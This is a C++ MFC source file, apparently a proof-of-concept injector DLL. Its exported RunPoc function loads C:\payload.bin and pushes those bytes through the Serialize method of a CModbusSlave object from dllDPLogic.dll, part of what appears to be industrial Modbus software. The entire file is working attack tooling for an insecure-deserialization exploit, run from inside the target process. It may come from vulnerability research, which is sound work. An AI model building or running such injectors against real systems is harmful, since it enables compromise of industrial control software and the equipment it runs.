#include <afx.h>
#include <afxwin.h>
#include <vector>

// 目标类工厂函数签名
typedef CRuntimeClass* (__stdcall* PGET_CLASS)();

// 辅助函数：显示错误，确保不乱码
void ShowError(LPCTSTR msg) {
    ::MessageBox(NULL, msg, _T("Injector Debug"), MB_OK | MB_ICONERROR);
}

extern "C" __declspec(dllexport) void RunPoc()
{
    AFX_MANAGE_STATE(AfxGetStaticModuleState());

    const TCHAR* kPayloadPath = _T("C:\\payload.bin");
    CFile file;

    // 1. 打开文件
    if (!file.Open(kPayloadPath, CFile::modeRead | CFile::typeBinary)) {
        ShowError(_T("Failed to open C:\\payload.bin"));
        return;
    }

    ULONGLONG size = file.GetLength();
    if (size == 0) {
        ShowError(_T("Payload is empty"));
        file.Close();
        return;
    }

    // 2. 读取数据
    std::vector<BYTE> buffer((size_t)size);
    file.Read(buffer.data(), (UINT)size);
    file.Close();

    // 3. 构建反序列化环境
    CMemFile memFile(buffer.data(), (UINT)size);
    CArchive ar(&memFile, CArchive::load);

    // 4. 获取模块和工厂
    HMODULE module = ::GetModuleHandle(_T("dllDPLogic.dll"));
    if (!module) {
        ShowError(_T("dllDPLogic.dll not loaded in this process"));
        return;
    }

    // 注意：GetProcAddress 的参数永远是 ANSI，不需要 _T()
    FARPROC proc = ::GetProcAddress(module, "?GetThisClass@CModbusSlave@@SGPAUCRuntimeClass@@XZ");
    if (!proc) {
        ShowError(_T("CModbusSlave factory not found! Check symbol name."));
        return;
    }

    // 5. 创建对象
    PGET_CLASS getClass = reinterpret_cast<PGET_CLASS>(proc);
    CRuntimeClass* runtimeClass = getClass ? getClass() : nullptr;
    if (!runtimeClass) {
        ShowError(_T("Runtime class pointer is null"));
        return;
    }

    CObject* obj = runtimeClass->CreateObject();
    if (!obj) {
        ShowError(_T("Failed to CreateObject()"));
        return;
    }

    // 6. 执行反序列化 (这是关键一步)
    try {
        obj->Serialize(ar);

        // 如果能走到这里，说明成功了！
        ::MessageBox(NULL, _T("🎉 Success: Object Hydrated!"), _T("Injector"), MB_OK);
    }
    catch (CException* e) {
        TCHAR szCause[1024] = { 0 };
        e->GetErrorMessage(szCause, 1024);

        CString msg;
        msg.Format(_T("Serialize Failed:\n%s"), szCause);
        ShowError(msg);

        e->Delete();
    }

    // 清理
    delete obj;
    ar.Close();
    memFile.Close();
}
